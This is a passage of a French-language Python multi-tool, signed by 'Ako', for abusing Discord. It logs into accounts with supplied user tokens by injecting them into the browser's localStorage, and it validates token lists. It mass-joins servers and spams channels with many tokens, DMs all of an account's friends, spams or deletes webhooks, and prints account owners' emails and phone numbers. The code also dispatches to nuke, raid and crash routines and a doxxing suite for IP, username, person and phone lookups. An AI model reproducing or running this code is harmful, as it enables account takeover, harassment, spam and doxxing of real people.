            requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)
    else:
        print(invalide + 'Token invalide')
        input(important + "Appuie pour quitter...")
        exit(0)


ClsDm = []
class Login(discord.Client):
    async def on_connect(self):
        for c in self.private_channels:
            ClsDm.append(c.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except:
            os.system("cls")
            print(invalide + "Erreur")
            input(important + "Appuie pour quitter...")

def dmcls():
    os.system("cls")
    print("""
 ██████╗██╗     ███████╗ █████╗ ██████╗     ██████╗ ███╗   ███╗
██╔════╝██║     ██╔════╝██╔══██╗██╔══██╗    ██╔══██╗████╗ ████║
██║     ██║     █████╗  ███████║██████╔╝    ██║  ██║██╔████╔██║
██║     ██║     ██╔══╝  ██╔══██║██╔══██╗    ██║  ██║██║╚██╔╝██║
╚██████╗███████╗███████╗██║  ██║██║  ██║    ██████╔╝██║ ╚═╝ ██║
 ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═╝     ╚═╝ devlopped by Ako          
          
          """)
    token = input("[>] Indique le token : ")
    head = {'Authorization': token}
    try:
        for id in ClsDm:
            requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=head)
            print(f"{wait} Message Close : {id}")
    except:
        print(f"{invalide} Impossible de Close : {id}")

    
def deletemsg():
    print("""
██████╗ ███████╗██╗     ███████╗████████╗███████╗    ███╗   ███╗███████╗███████╗███████╗ █████╗  ██████╗ ███████╗
██╔══██╗██╔════╝██║     ██╔════╝╚══██╔══╝██╔════╝    ████╗ ████║██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝ ██╔════╝
██║  ██║█████╗  ██║     █████╗     ██║   █████╗      ██╔████╔██║█████╗  ███████╗███████╗███████║██║  ███╗█████╗  
██║  ██║██╔══╝  ██║     ██╔══╝     ██║   ██╔══╝      ██║╚██╔╝██║██╔══╝  ╚════██║╚════██║██╔══██║██║   ██║██╔══╝  
██████╔╝███████╗███████╗███████╗   ██║   ███████╗    ██║ ╚═╝ ██║███████╗███████║███████║██║  ██║╚██████╔╝███████╗
╚═════╝ ╚══════╝╚══════╝╚══════╝   ╚═╝   ╚══════╝    ╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ devlopped by Ako
    
    """)
    token = str(input("[>] Entrez votre token : "))
    headers = {
        "authorization": token,
        "accept-language": "fr"
    }
    tokenid = requests.get("https://discordapp.com/api/v8/users/@me", headers=headers).json()["id"]
    r = requests.get("https://discordapp.com/api/v8/users/@me/channels", headers=headers).json()
    for dm in r:
        token_dm = dm["id"]
        token_dm_name = dm["recipients"][0]["username"]
        token_requests = requests.get(f"https://discordapp.com/api/v8/channels/{token_dm}/messages", headers=headers).json()
        for message in token_requests:
            MsgId = message["id"]
            author = message["author"]["id"]
            message_content = message["content"]
            if author == str(tokenid):
                r3 = requests.delete(f"https://discordapp.com/api/v8/channels/{token_dm}/messages/{MsgId}", headers=headers)
                if r3.status_code == 204:
                    print(f"{valide} Message supprime [{token_dm_name}] : {message_content}")
                elif r3.status_code == 429:
                    time1 = r3.json()["retry_after"]
                    print(f"{wait} Erreur, je réesaye dans : {time1}s")
                    time.sleep(int(r3.json()["retry_after"])+0.5)
                    rratelimit = requests.delete(f"https://discordapp.com/api/v8/channels/{token_dm}/messages/{MsgId}", headers=headers)
                else:
                    print(invalide + "Erreur lors de la suppression...")
                    sleep(1)
    


def Joiner():
    os.system("cls")
    print("""
    ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗         ██╗ ██████╗ ██╗███╗   ██╗███████╗██████╗ 
    ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║         ██║██╔═══██╗██║████╗  ██║██╔════╝██╔══██╗
       ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║         ██║██║   ██║██║██╔██╗ ██║█████╗  ██████╔╝
       ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██   ██║██║   ██║██║██║╚██╗██║██╔══╝  ██╔══██╗
       ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚█████╔╝╚██████╔╝██║██║ ╚████║███████╗██║  ██║
       ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ devlopped by Ako

    """"")

    link = input("[>] Lien d'invitation du serveur : ")
    fichier = input("[>] Fichier token (.txt) : ")
    if fichier == '':
        fichier = "token.txt"

    if len(link) > 6:
        link = link[19:]
    apilink = "https://discordapp.com/api/v6/invite/" + str(link)

    print (link)

    with open(fichier,'r') as handle:
            tokens = handle.readlines()
            for x in tokens:
                token = x.rstrip()
                headers={
                    'Authorization': token
                    }
                requests.post(apilink, headers=headers)
            print(information + "Tous les tokens ont join.")


def SpamToken():
    os.system("cls")
    print("""
████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ███████╗██████╗  █████╗ ███╗   ███╗
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ███████╗██████╔╝███████║██╔████╔██║
   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ███████║██║     ██║  ██║██║ ╚═╝ ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ devlopped by Ako
    """)
    fichier = input("[>] Fichier token (.txt) : ")
    if fichier == '':
        fichier = "token.txt"
    tokens = open(fichier, 'r')
    tokens = tokens.read()
    tokens = tokens.splitlines()
    msgnumb = input("[>] Combien de message a envoyer : ")
    msgtosend = input("[>] Entrer le message a envoyer : ")
    channelid = input("[>] Channel id : ")


    def main(token):
        for _ in range(int(msgnumb)):
            headers = {"authorization": token, "content-type": 'application/json'}
            url = f'https://discord.com/api/v9/channels/{channelid}/messages'
            payload = {"content": f"{msgtosend}"}
            try:
                requests.post(url, headers=headers, data=json.dumps(payload))
                print(f" {wait} - Message envoyés.\n")
            except:
                print(information + "Error.")

    for token in tokens:
        Thread(target=main, args=(token,)).start()


def info():
    os.system("cls")
    token = input("[>] Indique le token : ")
    head = {'Authorization': str(token)}
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    if src.status_code == 200:
        print(valide + 'Token valide')
        input(important + "Appuie pour continuer...")
        print(""""
    ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ██╗███╗   ██╗███████╗ ██████╗ 
    ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██║████╗  ██║██╔════╝██╔═══██╗
       ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║██╔██╗ ██║█████╗  ██║   ██║
       ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║██║╚██╗██║██╔══╝  ██║   ██║
       ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ██║██║ ╚████║██║     ╚██████╔╝
       ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ devlopped by Ako
        
        """"")
        headers = {'Authorization': token, 'Content-Type': 'application/json'}  
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        if r.status_code == 200:
                userName = r.json()['username'] + '#' + r.json()['discriminator']
                userID = r.json()['id']
                phone = r.json()['phone']
                email = r.json()['email']
                mfa = r.json()['mfa_enabled']
                print(f'''
                {information} Compte :    {userName} ({userID})
                {information} A2F    :    {mfa}
                {information} Email  :    {email}
                {information} Numero :    {phone if phone else ""}
                {information} Token  :    {token}
                ''')
                input()
    else:
        print(invalide + 'Token invalide')
        input(important + "Appuie pour quitter...")
        exit(0)  


def check():
    os.system("cls")
    print("""
████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ devlopped by Ako          
          
          """)
    fichier = input("[>] Dossier name : ")
    url = "https://discordapp.com/api/v6/users/@me/library"
    tokens = open(f"{fichier}", 'r').read()
    tokens = tokens.split('\n')

    for token in tokens:
	    header = {
			"Content-Type": "application/json",
			"authorization": token
		}

	    code = r.get(url, headers=header).status_code

	    if (code == 200):
		    print(f"{valide}Token valide : {token}")
		    with open("TokenValide.txt", "a") as f:
			    f.write(token + "\n")
	    elif (code == 401):
		    print(invalide + "Token invalide : " + token)
    input()
    input(important + "Appuie pour quitter...")

"""

██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝        ██║   ██║   ██║██║   ██║██║     
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗        ██║   ██║   ██║██║   ██║██║     
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝

"""


def webDel():
    os.system("cls")
    print("""
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗    ██████╗ ███████╗██╗     ███████╗████████╗███████╗
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔══██╗██╔════╝██║     ██╔════╝╚══██╔══╝██╔════╝
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝     ██║  ██║█████╗  ██║     █████╗     ██║   █████╗  
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗     ██║  ██║██╔══╝  ██║     ██╔══╝     ██║   ██╔══╝  
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗    ██████╔╝███████╗███████╗███████╗   ██║   ███████╗
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚═════╝ ╚══════╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ devlopped by Ako

    """)
    webhook = input("[>] Indique l'url du webhook : ")
    if "https://discord.com/api/webhooks/" not in webhook:
        print(invalide + "Entrer un lien de Webhook correct.")
        input(important + 'Appuie pour quitter...')
        exit(0)
    elif "https://discord.com/api/webhooks/" in webhook:
        check = requests.get(webhook)
        if check.status_code == 200:
            print(valide + "Webhook valide")
            print(wait + "Suppresion du webhook en cours...")
            requests.delete(webhook)  
            print(valide + "Suppresion réussi !")
        else:
            print(invalide + "Webhook invalide")
            input(important + 'Appuie pour quitter...')


def webCheck():
    os.system("cls")
    print("""
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ devlopped by Ako

    """)
    webhook = input("[>] Indique l'url du webhook")
    check = requests.get(webhook)
    if check.status_code == 200:
        print(valide + "Webhook valide !")
        input(important + "Appuie pour quitter...")
    else:
        print(invalide + "Webhook invalide !")
        input(important + "Appuie pour quitter...")


def whbSpam():
    os.system("cls")
    print("""
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗    ███████╗██████╗  █████╗ ███╗   ███╗
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝     ███████╗██████╔╝███████║██╔████╔██║
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ devlopped by Ako

    """)
    link = input("[>] Indique l'url du webhook : ")
    if "https://discord.com/api/webhooks/" not in link:
        print(invalide + "Entrer un lien de Webhook correct.")
        input(important + 'Appuie pour quitter...')
    elif "https://discord.com/api/webhooks/" in link:
        check = requests.get(link)
        if check.status_code == 200:
            print(valide + "Webhook valide")
            message = input("[>] Indique le message a spam : ")
            if message == '':
                message = "@everyone Fucked by Ako"
            nombre = int(input("[>] Combien de messages veux-tu send : "))
            if nombre == '':
                nombre = 100
            counter = 0
            name = input("[>] Rename le webhook : ")
            if name == '':
                name = 'Fucked by Ako'
            pdp = input("[>] PP webhook : ")
            if pdp == '':
                pdp = 'https://cdn.discordapp.com/avatars/846191293536665631/465585a8086acf4c84517f0d2f725a1b.png?size=4096'
            webhook = {
                "content": message,
                "username": name,
                "avatar_url": pdp
            }
            while nombre > counter:
                try:
                    counter += 1
                    urlopen(Request(link, data=dumps(webhook).encode(), headers=getheaders()))
                    print(f"{wait} {counter} Message send")
                except:
                    print(invalide + "Message non envoyé")
                    pass

        else:
            print(invalide + "Webhook invalide")
            input(important + 'Appuie pour quitter...')


def whbinfo():
    os.system("cls")
    print("""
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗    ██╗███╗   ██╗███████╗ ██████╗ 
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ██║████╗  ██║██╔════╝██╔═══██╗
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝     ██║██╔██╗ ██║█████╗  ██║   ██║
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗     ██║██║╚██╗██║██╔══╝  ██║   ██║
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗    ██║██║ ╚████║██║     ╚██████╔╝
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ devlopped by Ako          
          
          """)
    hook = Webhook(input("[>] Indique l'url du webhook : "))
    if "https://discord.com/api/webhooks/" not in hook:
        print(invalide + "Entrer un lien de Webhook correct.")
        input(important + 'Appuie pour quitter...')
    elif "https://discord.com/api/webhooks/" in hook:
        hook.get_info()
        print(f"\n GUILD ID    : {hook.guild_id}")
        print(f" CHANNEL ID  : {hook.channel_id}")
        print(f" USERNAME    : {hook.default_name}")
        print(f" IMAGE       : {hook.default_avatar_url}")
    else:
        print(invalide + "Webhook invalide")
        input(important + 'Appuie pour quitter...')



"""

██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     
██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║██████╔╝       ██║   ██║   ██║██║   ██║██║     
██║██╔═══╝        ██║   ██║   ██║██║   ██║██║     
██║██║            ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝

"""


def ipPinger():
    os.system("cls")
    print("""
██╗██████╗     ██████╗ ██╗███╗   ██╗ ██████╗ 
██║██╔══██╗    ██╔══██╗██║████╗  ██║██╔════╝ 
██║██████╔╝    ██████╔╝██║██╔██╗ ██║██║  ███╗
██║██╔═══╝     ██╔═══╝ ██║██║╚██╗██║██║   ██║
██║██║         ██║     ██║██║ ╚████║╚██████╔╝
╚═╝╚═╝         ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ devlopped by Ako
          
          """)
    ip = input("[>] Indique l'adresse ip : ")
    ping = os.system("ping " + ip + " -t")
    print(ping)

def iplook():
    os.system("cls")
    print("""
██╗██████╗     ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
██║██╔══██╗    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
██║██████╔╝    ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
██║██╔═══╝     ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ 
██║██║         ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║     
╚═╝╚═╝         ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝ devlopped by Ako          
          
          """)
    ip = input("[>] Indique l'adresse ip : ")
    data = requests.get("http://ip-api.com/json/" + ip + "?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy")
    resp = data.json()
    
    print("""
                                        ╦╔═╗  ╦  ╔═╗╔═╗╦╔═╦ ╦╔═╗  
                                        ║╠═╝  ║  ║ ║║ ║╠╩╗║ ║╠═╝  
                                        ╩╩    ╩═╝╚═╝╚═╝╩ ╩╚═╝╩ Devlopped by Ako 
                                                             
          """)
    print("                ╔═══════════════════════════════════════════════════════════════════════════════════╗")
    print("                ║                                                                                   ║")
    print(f"                                            {valide} - Resultat de : {ip}")
    print("")
    print(f"                                       {wait} Continent      : " + resp["continent"])
    print(f"                                       {wait} Continent Code : " + resp["continentCode"])
    print(f"                                       {wait} Pays           : " + resp["country"])
    print(f"                                       {wait} Pays Code      : " + resp["countryCode"])
    print(f"                                       {wait} Region         : " + resp["region"])
    print(f"                                       {wait} Region Nom     : " + resp["regionName"])
    print(f"                                       {wait} Ville          : " + resp["city"])
    print(f"                                       {wait} Code Postal    : " + resp["zip"])
    print(f"                                       {wait} Latitude       : " + str(resp["lat"]))
    print(f"                                       {wait} Longitude      : " + str(resp["lon"]))
    print(f"                                       {wait} Timezone       : " + resp["timezone"])
    print(f"                                       {wait} Monnaie        : " + resp["currency"])
    print(f"                                       {wait} Opérateur      : " + resp["isp"])
    print(f"                                       {wait} Mobile         : " + str(resp["mobile"]))
    print(f"                                       {wait} Proxy: " + str(resp["proxy"]))
    print("")
    print("                ║                                                                                   ║")
    print("                ╚═══════════════════════════════════════════════════════════════════════════════════╝")
    input("")
    input(valide + "Appuie pour quitter...")


"""

██████╗  ██████╗ ██╗  ██╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║  ██║██║   ██║ ╚███╔╝  ╚███╔╝        ██║   ██║   ██║██║   ██║██║     
██║  ██║██║   ██║ ██╔██╗  ██╔██╗        ██║   ██║   ██║██║   ██║██║     
██████╔╝╚██████╔╝██╔╝ ██╗██╔╝ ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ [ Modules du doxx tool dev by : lulz3xploit, lrhel, b1rdex (https://github.com/lulz3xploit/LittleBrother)]

"""


def pseudoLook():
    os.system("cls")
    print("""
██████╗ ███████╗███████╗██╗   ██╗██████╗  ██████╗     ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
██╔══██╗██╔════╝██╔════╝██║   ██║██╔══██╗██╔═══██╗    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
██████╔╝███████╗█████╗  ██║   ██║██║  ██║██║   ██║    ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
██╔═══╝ ╚════██║██╔══╝  ██║   ██║██║  ██║██║   ██║    ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ 
██║     ███████║███████╗╚██████╔╝██████╔╝╚██████╔╝    ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║     
╚═╝     ╚══════╝╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝ devlopped by Ako              
                   
          """)
    print()
    pseudo = input("[>] Pseudo : ")
    instagram = f"https://www.instagram.com/{pseudo}/"
    facebook = f"https://www.facebook.com/{pseudo}/"
    twitter = f"https://twitter.com/{pseudo}"
    youtube = f"https://www.youtube.com/user/{pseudo}"
    google_plus = f"https://plus.google.com/s/{pseudo}/top"
    reddit = f"https://www.reddit.com/user/{pseudo}"
    wordpress = f"https://{pseudo}.wordpress.com"
    pinterest = f'https://www.pinterest.com/{pseudo}'
    github = f'https://www.github.com/{pseudo}'
    tumblr = f'https://{pseudo}.tumblr.com'
    steam = f'https://steamcommunity.com/id/{pseudo}'
    soundcloud = f'https://soundcloud.com/{pseudo}'
    imgur = f'https://imgur.com/user/{pseudo}'
    spotify = f'https://open.spotify.com/user/{pseudo}'
    codecademy = f'https://www.codecademy.com/{pseudo}'
    pastebin = f'https://pastebin.com/u/{pseudo}'
    roblox = f'https://www.roblox.com/user.aspx?username={pseudo}'
    tripadvisor = f'https://tripadvisor.com/members/{pseudo}'
    wikipedia = f'https://www.wikipedia.org/wiki/User:{pseudo}'
    hackernews = f'https://news.ycombinator.com/user?id={pseudo}'
    ebay = f'https://www.ebay.com/usr/{pseudo}'
    
    site = [instagram, facebook, twitter, youtube, google_plus, reddit, wordpress, pinterest, github, tumblr, steam, soundcloud, imgur, spotify, codecademy, pastebin, roblox, tripadvisor, wikipedia, hackernews, ebay]
    def doxing(link):
        source = requests.get(link).text
        if pseudo in source:
            with print_lock:
                print(f"{valide} Pseudo trouvé : {link}")
        else:
                print(f"{invalide} Pseudo Non trouvé : {link}")
                pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        for link in site:
            executor.submit(doxing, link)

"""

███╗   ██╗ █████╗ ██╗   ██╗██╗ ██████╗  █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔══██╗██║   ██║██║██╔════╝ ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║███████║██║   ██║██║██║  ███╗███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██╔══██║╚██╗ ██╔╝██║██║   ██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║██║  ██║ ╚████╔╝ ██║╚██████╔╝██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝╚═╝  ╚═╝  ╚═══╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

"""
if start == '1':
    choice = tokenstart()
    if choice == '1':
        os.system("cls")
        token = input('[>] Indique le token : ')
        head = {'Authorization': str(token)}
        src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
        if src.status_code == 200:
            print(valide + 'Token valide')
            input(important + "Appuie pour continuer...")  
            mdmbot = discord.Client()
            @mdmbot.event
            async def on_connect():
                print("""
            ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ██████╗ ███╗   ███╗
            ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔══██╗████╗ ████║
               ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║  ██║██╔████╔██║
               ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║  ██║██║╚██╔╝██║
               ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ██████╔╝██║ ╚═╝ ██║
               ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚═════╝ ╚═╝     ╚═╝ devlopped by Ako

            """)
                message = input('[>] Indique le message : ')
                if message == '':
                    message = '[ Discord ] - https://discord.gg/generator'
                print("")
                print("")
                print(Fore.RED + "Start DmAll : " + Fore.RESET)
                print("")

                for user in mdmbot.user.friends:
                    try:
                        await user.send(message)
                        print(f"{valide} Message Sended : {user.name}")
                    except:
                        print(f"{invalide} Message Failed : {user.name}")

            mdmbot.run(token, bot=False)    
        else:
            print(invalide + 'Token invalide')
            input(important + "Appuie pour quitter...")
            exit(0)    
    elif choice == '2':
        os.system("cls")
        print("""
        ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ██╗      ██████╗  ██████╗ ██╗███╗   ██╗
        ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║
           ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
           ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║     ██║   ██║██║   ██║██║██║╚██╗██║
           ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
           ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ devlopped by Ako   
            
        """)

        token = input('[>] Indique le token : ')
        head = {'Authorization': str(token)}
        src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
        if src.status_code == 200:
                print(valide + 'Token valide')
                input(important + "Appuie pour continuer...")
                driver = webdriver.Chrome(executable_path="chromedriver.exe")
                driver.get('https://discord.com/login')
                script = """
                            function login(token) {
                            setInterval(() => {
                            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                            }, 50);
                            setTimeout(() => {
                            location.reload();
                            }, 2500);
                            }
                            """
                driver.execute_script(script + f'\nlogin("{token}")')
        else:
            print(invalide + 'Token invalide')
            input(important + "Appuie pour quitter...")
            exit(0)

    elif choice == '3':
        fuck = fucker()
        if fuck == '1':
            Nuke()
        elif fuck == '2':
            serveurs()
        elif fuck == '3':
            friend()
        elif fuck == '4':
            spamserv()
        elif fuck == '5':
            Crash()
        elif fuck == '6':
            deletemsg()
    elif choice == '4':
        raid = TokenRaid()
        if raid == '1':
            Joiner()
        elif raid == '2':
            SpamToken()
    elif choice == '5':
        info()
    elif choice == '6':
        check()
elif start == '2':
    whb = webhookstart()
    if whb == '1':
        webDel()
    elif whb == '2':
        whbSpam()
    elif whb == '3':
        webCheck()
    elif whb == '4':
        whbinfo()
elif start == '3':
    ip = ipstart()
    if ip == '1':
        ipPinger()
    elif ip == '2':
        iplook()
elif start == '4':
    doxx = doxxTool()
    if doxx == '1':
        pseudoLook()
        input()
        input(important + "Appuie pour quitter...")
    elif doxx == '2':
        cp = input("[>] Code pays : ")
        searchPersonne(codemonpays=cp)
        input()
        input(important + "Appuie pour quitter...")
    elif doxx == '3':
        cp = input("[>] Code pays : ")
        searchNumber(codemonpays=cp)
        input()
        input(important + "Appuie pour quitter...")
    elif doxx == '4':
        dox = reseauxLook()
        if dox == '1':
            facebookStalk()
            input()
            input(important + "Appuie pour quitter...")
        elif dox == '2':
            searchTwitter()
            input()
